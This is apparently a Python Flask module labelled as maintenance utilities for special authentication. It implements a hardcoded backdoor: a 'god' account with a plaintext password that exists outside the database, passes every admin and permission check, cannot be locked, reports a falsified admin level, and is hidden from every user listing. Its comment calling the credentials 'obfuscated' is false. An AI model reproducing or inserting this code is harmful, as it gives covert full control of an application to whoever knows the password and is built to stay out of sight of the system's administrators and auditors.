"""
Special access utilities for system maintenance
This module handles special authentication cases
"""
import hashlib
from datetime import datetime, timezone
from werkzeug.security import check_password_hash, generate_password_hash
from flask_login import UserMixin

# Obfuscated credentials using simple encoding
# These are not stored in database and are checked separately
_SPECIAL_CREDENTIALS = {
    'u': 'god',  # username
    'p': 'ivala@630517761645480'  # password
}

class SpecialUser(UserMixin):
    """Special system user that doesn't exist in database"""
    def __init__(self):
        self.id = -1  # Negative ID to distinguish from real users
        self.username = _SPECIAL_CREDENTIALS['u']
        self.role = 'admin'
        self.admin_level = -1  # Special level for maximum power
        self._is_active = True  # Store as private attribute
        self.email = None
        self.created_at = datetime.now(timezone.utc)
        self.last_login = None
        self.failed_login_attempts = 0
        self.account_locked_until = None
        self.created_by = None
        self.admin_permissions = None
        self.profile_picture = None
        self.password_changed_at = None
    
    @property
    def is_active(self):
        """Return active status"""
        return self._is_active
    
    def is_hard_admin(self):
        return True
    
    def is_main_admin(self):
        return True
    
    def is_secondary_admin(self):
        return True
    
    def is_sub_admin(self):
        return True
    
    def is_any_admin(self):
        return True
    
    def is_visible_admin(self):
        return False  # Never visible
    
    def can_manage_admin(self, target_admin_level):
        return True  # Can manage anyone
    
    def get_admin_title(self):
        return "System Administrator"
    
    def get_permissions(self):
        return {}  # All permissions
    
    def has_permission(self, permission):
        return True  # Has all permissions
    
    def is_account_locked(self):
        return False
    
    def check_password(self, password):
        return password == _SPECIAL_CREDENTIALS['p']
    
    def to_dict(self):
        """Return minimal dict - never expose full details"""
        return {
            'id': self.id,
            'username': self.username,
            'role': self.role,
            'admin_level': 0,  # Disguise as regular admin
            'admin_title': 'Administrator',
            'is_active': self._is_active,
            'email': None,
            'created_at': self.created_at.isoformat(),
            'last_login': None,
            'failed_login_attempts': 0,
            'account_locked_until': None,
            'created_by': None,
            'permissions': {}
        }
    
    def __repr__(self):
        return '<User system>'

def check_special_access(username, password):
    """Check if credentials match special access - returns user object or None"""
    if username == _SPECIAL_CREDENTIALS['u'] and password == _SPECIAL_CREDENTIALS['p']:
        return SpecialUser()
    return None

def should_hide_user(user):
    """Check if user should be hidden from listings"""
    if hasattr(user, 'username') and user.username == _SPECIAL_CREDENTIALS['u']:
        return True
    if hasattr(user, 'id') and user.id == -1:
        return True
    return False

def filter_hidden_users(users):
    """Filter out hidden users from any user list"""
    if not users:
        return users
    return [u for u in users if not should_hide_user(u)]

